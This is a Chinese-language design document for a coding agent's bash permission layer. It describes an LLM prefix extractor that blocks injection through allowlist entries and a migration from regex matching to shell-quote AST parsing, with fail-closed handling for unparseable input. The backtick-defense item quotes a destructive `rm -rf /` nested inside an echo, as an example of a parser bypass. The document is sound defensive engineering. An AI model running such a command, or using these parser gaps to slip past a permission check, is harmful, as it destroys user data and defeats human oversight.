### 非目标

- **AST migration（FEATURE_152 scope）**：FEATURE_153 解决的是"用户允许列表的安全匹配"问题，FEATURE_152 解决的是"`isBashReadCommand` / `isBashWriteCommand` 等内部判定的解析鲁棒性"。两者完全独立，可以并行 ship 无冲突。
- **`Bash(*)` allowlist**：仍然显式拒绝（`matchesBashPatternByExtractedPrefix` 第一行 `if (pattern === '*') return false`）。任何"全开"配置都必须显式选择 `auto` 模式而不是用 allowlist 偷渡。
- **classifier 替代**：FEATURE_153 不替代 FEATURE_092 auto-mode classifier。两者职责完全不同：
  - **FEATURE_092**: "**任意命令在 auto 模式下是否安全自动执行**"
  - **FEATURE_153**: "**用户在 accept-edits 模式下手动允许的 prefix 是否真的是 prefix（防注入）**"
- **从 `isBashReadCommand` 路径调用 extractor**：read-only 命令本来就放行，无需 LLM 抽 prefix。FEATURE_154 `--help` fast-path 进一步绕过 LLM。

### 与其他 Feature 的关系

- **FEATURE_092 (v0.7.33) auto-mode classifier**：完全正交。FEATURE_153 在 `accept-edits` 模式生效，FEATURE_092 在 `auto` 模式生效。两者复用相同的 `sideQuery` 抽象 + 相同的 `getCurrentProviderName` / `getCurrentModel` live getter 模式。
- **FEATURE_154 (v0.7.38) `--help` fast-path**：在 FEATURE_153 之前——`* --help` 命令直接被 `isBashReadCommand` 放行（在 `confirmTools.has('bash')` 之前），不进 `isToolCallAllowed`，不调 LLM。组合效果：90%+ 常见命令走规则 fast-path，剩余真正需要"用户允许"判定的进 LLM extractor。
- **FEATURE_152 (v0.7.38) AST migration**：互补——AST 提供裸命令解析的语法鲁棒性，extractor 提供 LLM-driven 语义抽象（处理 alias / unfamiliar tools / 自然语言式命令）。FEATURE_152 落地后，extractor 内部仍然用 LLM（不切到 AST），因为安全 prefix 本质是语义判定不是语法判定。
- **Issue 129 (v0.7.38)**：Issue 129 解决"规则层假阳性"（合法 piped 命令被错判为 write），FEATURE_153 解决"规则层漏报"（注入命令被错判为安全 allowlist 命中）。两个相反方向的安全提升。

### 参考

- CC 实现：[`c:/Works/claudecode/src/utils/bash/commands.ts:438-499`](C:\Works\claudecode\src\utils\bash\commands.ts#L438-L499) (`BASH_POLICY_SPEC`)、[`c:/Works/claudecode/src/utils/shell/prefix.ts`](C:\Works\claudecode\src\utils\shell\prefix.ts) (`createCommandPrefixExtractor`)
- KodaX 实现：[`bash-prefix-extractor.ts`](../../packages/coding/src/guardrails/auto-mode/bash-prefix-extractor.ts)、[`permission.ts:isToolCallAllowed`](../../packages/repl/src/permission/permission.ts)
- 触发本 feature 的 Issue 129：[`docs/KNOWN_ISSUES.md#129`](../KNOWN_ISSUES.md#129)
- 实现 commit：`912aea9` (Step 1 module)、`1e825cd` (Step 2 wiring)、`2f21718` (review fix: fail-closed on throw, 与 FEATURE_151 共 commit 因 git race)

---

## FEATURE_152: Bash AST Migration

### 背景

[Issue 129](../KNOWN_ISSUES.md#129) 用"strip-then-classify"思路打的 hotfix——加一个 module-level regex `NULL_DEVICE_REDIRECT_PATTERN` 把 `2>NUL` / `2>/dev/null` 在跑既有 regex 前擦除——快速止血让 auto 模式不再被纯只读管道命令打断。但 Issue 129 Resolution 自己写：

> 替代方案考虑过 ... 彻底重写 `isBashReadCommand` 用 shell parser — 引入新依赖，超 scope。

FEATURE_152 立项把这个被推迟的工作做完。同版本 (v0.7.38) ship 是为了趁着权限层热度同步把整个 bash 解析层升级到结构化，而不是再叠一层 regex 补丁。

### 为什么不用 tree-sitter

Tree-sitter 是真正的"语法树"方案，最完整。但：

| 维度 | tree-sitter + wasm | shell-quote (FEATURE_152 选) |
|---|---|---|
| 体积 | ~500KB on disk + wasm runtime + tree-sitter loader | ~12KB pure JS |
| 依赖结构 | 需要专门的 wasm-bindgen 加载层 | 单 npm 依赖 |
| Real-world bash 覆盖 | ~99.9% | ~98% (不模型 heredoc 等) |
| KodaX 哲学 | 与"极致轻量化" (CLAUDE.md) 冲突 | 对齐 |
| AST `unparseable` fallback | 极少触发 | 触发时 caller fail-closed |

shell-quote 解析不出的 2% case（多行 heredoc、复杂 `$(...)` 嵌套）我们显式标记 `unparseable: true`，所有 caller fail-closed (返回 false → 走确认弹窗)。这是有意识的"宁可严格也不要漏报"的安全选择。

### 设计

#### 模块 [`packages/repl/src/permission/bash-ast.ts`](../../packages/repl/src/permission/bash-ast.ts)

```ts
parseBashCommand(command: string): BashCommandTree

interface BashCommandTree {
  statements: BashStatement[];   // 按 && / || / ; 切
  unparseable: boolean;          // shell-quote 无法 tokenise，caller 应 fail-closed
}

interface BashStatement {
  precedingOp: '&&' | '||' | ';' | null;
  stages: BashPipelineStage[];   // 按 | 切
}

interface BashPipelineStage {
  argv: readonly string[];           // quoting 已 strip
  redirections: readonly BashRedirection[];
}

interface BashRedirection {
  op: string;                  // '>', '>>', '<', '2>', '&>', ...
  fd: string | null;           // '2' 对 `2>NUL`，'&' 对 `&>foo`
  append: boolean;             // '>>'
  input: boolean;              // '<', '<<', '<<<'
  target: string;              // 已 unquote
}

isNullDevice(target: string): boolean   // /dev/null / NUL / nul
```

**三个不易察觉的实现细节**：

1. **fd-prefix 重组**：shell-quote 把 `2>NUL` tokenise 成三个 token `'2'` + `{op:'>'}` + `'NUL'`（"2" 是个 string，不是 redirection 的一部分）。`parseBashCommand` 检测 redirection op 前的 argv 末尾是不是数字字面量，是的话 pop 出来作为 redirection 的 `fd`。
2. **`&>` 融合**：shell-quote 把 `&>` tokenise 成两个 op token `{op:'&'}` + `{op:'>'}`。`parseBashCommand` 看到孤立 `&` op 后跟 `>` / `>>` 时融合为单个 `&>` redirection。否则 bare `&` (背景作业标记) 标 unparseable。
3. **Backtick 防御**：`shell-quote` 把 `` ` `` 当普通字符放进 string token，`echo \`rm -rf /\`` 在 AST 视角会变成 `argv = ['echo', '\`rm', '-rf', '/\`']`——argv[0] 安全的 echo + 看似无害的 args。`parseBashCommand` 在 tokenise 之前显式 `if (trimmed.includes('\`'))` 标 `unparseable: true`，所有 caller 自动 fail-closed。

#### 4 个 caller 的迁移

| Function | Slice | 实现策略 |
|---|---|---|
| `isBashReadCommand` | 2 | 完全 AST：每个 stage 检查 redirections（input 拒绝、output 必须是 null device）+ argv join 回 string 跑既有的 `isSingleBashReadCommand` 字符串检查器（保留逻辑） |
| `isBashWriteCommand` | 2 | 完全 AST：每个 stage `argv[0]` / `argv[0..1]` 对照 `BASH_WRITE_COMMANDS` + `argvLower` 任意位置对照 `POWERSHELL_WRITE_TOKENS` (9 verbs，CC 路径覆盖更广) + redirections.target 不是 null device 即写 |
| `extractPathsFromCommand` | 3 | **Hybrid AST + legacy regex**：AST 走 argv + redirections 拿干净的 token；Windows 反斜杠路径 (`C:\Users\foo`) 走 legacy regex 兜底（shell-quote 把 `\` 当 POSIX escape，会把 `C:\Users\foo` 切成 `C:Users` + `oo\bar.txt` 这种碎片）；两个 set 合并去重 |
| `collectBashWriteTargets` | 3 | 完全 AST：per-stage redirections.target + per-stage `argv[0] === 'tee'` 走 `collectTeeTargets`（跳 `-a`/`--append`/`-i`/`--ignore-interrupts`）+ per-stage `argv[0] in POWERSHELL_WRITE_TOKENS` 走 `collectPowerShellWriteTargets`（识别 `-Path` / `-LiteralPath` / `-Destination`）+ early `extractPathsFromCommand` 作为宽松 path-token 网（不去掉，保持原"宁可严格"语义） |

#### 删除的代码（全部在 slice 2）

```ts
// permission.ts，全部 strip-then-classify 配套，AST 后再无意义
const NULL_DEVICE_REDIRECT_PATTERN = ...;
const BASH_WRITE_COMMAND_REGEXES = ...;
const BASH_WRITE_SUBCOMMAND_PATTERNS = ...;
const BASH_REDIRECTION_WRITE_PATTERN = ...;
```

`isSingleBashReadCommand` 保留（仍然处理 sed/-i / awk -f / 语言工具白名单等单字符串语法检查）；`legacyRegexPathScan` 保留（Windows 反斜杠路径兜底）。这两条都不是 strip-then-classify 路径的延伸，是不可替代的能力。

### 验收标准

- 单元测试 [`bash-ast.test.ts`](../../packages/repl/src/permission/bash-ast.test.ts) 24/24（argv tokenisation、pipeline split、redirection 各形态、null-device variants、unparseable safety、backtick / `$(...)` 触发 unparseable、flatten 助手、isNullDevice 边界）
- 单元测试 [`permission.test.ts`](../../packages/repl/src/permission/permission.test.ts) 全部 88/88（含 14 attack-surface hardening + 12 isBashRead/Write AST hardening + 12 collectBashWriteTargets / extractPathsFromCommand AST hardening + 全部既有 + Issue 129 8 个回归测试一行不动通过）
- `npm run build` 跨 9 包绿
- Issue 129 hotfix 升级为结构性解决，Resolution Follow-up section 新增

### 非目标

- **switch tree-sitter**：见上"为什么不用 tree-sitter"。如果未来出现 shell-quote 边界 case 频繁触发 `unparseable=true` 影响 UX，再升级。
- **path-qualified 写命令检测**：`isBashWriteCommand('~/myrm foo')` 返回 false (path-qualified executable 不在 BASH_WRITE_COMMANDS 关键字里)。这是 single-user CLI 的有意识 scope 决定——agent 自己生成命令文本、FEATURE_092 LLM classifier 是 upstream 语义闸门、3+ user reports 之前不加 ad-hoc patch。`permission.test.ts` 有专项测试 pin 这个已知限制 + 重评估 trigger 写在 inline comment。
- **改 `BASH_SAFE_READ_COMMANDS` 白名单内容**：FEATURE_152 是解析层迁移，不动白名单内容。Issue 129 已经把 `findstr` / `fc` / `where` 加进去过。

### 与其他 Feature 的关系

- **FEATURE_092 (v0.7.33) auto-mode classifier**：解析层在 classifier 之前，AST 让规则层判定更准（Issue 129 类假阳性消失），让 LLM classifier 只在真正不确定时介入。
- **FEATURE_153 (v0.7.38)**：LLM bash prefix extractor 走 `sideQuery` LLM 调用，不依赖 AST；两者职责完全正交（FEATURE_152 解析裸命令语法、FEATURE_153 提取语义安全前缀）。
- **FEATURE_154 (v0.7.38) `--help` fast-path**：在 `isBashReadCommand` 顶部，AST 解析之前命中——所有 `cmd --help` 形态命令绕过 AST 直接放行。
- **Issue 129 (v0.7.38)**：本 feature 替代 Issue 129 的"最小切口 strip-then-classify hotfix"为结构性解决。Issue 129 的 8 个回归测试在 FEATURE_152 之后一行不动继续通过——AST 严格保留语义，仅替换实现。

### 参考

- shell-quote: [npm registry @1.8.3](https://www.npmjs.com/package/shell-quote/v/1.8.3)、[GitHub](https://github.com/ljharb/shell-quote)
- KodaX 实现：[`bash-ast.ts`](../../packages/repl/src/permission/bash-ast.ts)、[`permission.ts`](../../packages/repl/src/permission/permission.ts)
- ADR-023：[`docs/ADR.md#adr-023`](../ADR.md#adr-023-bash-command-parsing--regex--ast-migration-feature_152-v0738)
- 触发本 feature 的 Issue 129：[`docs/KNOWN_ISSUES.md#129`](../KNOWN_ISSUES.md#129)
- 实现 commits：`9a001bb` (slice 1 module + 22 tests + shell-quote dep)、`a39ff5d` (slice 1 review fix)、`f61720c` (slice 2 isBashRead/Write AST + 删 strip-then-classify)、`23dec91` (slice 2 review fix)、`dc8b848` (slice 3 extractPaths/collectBashWriteTargets hybrid)、`4572758` (slice 3 review fix)、`a07f6f0` (slice 4 hardening + Issue 129 follow-up)、`1f51093` (slice 4 review fix)

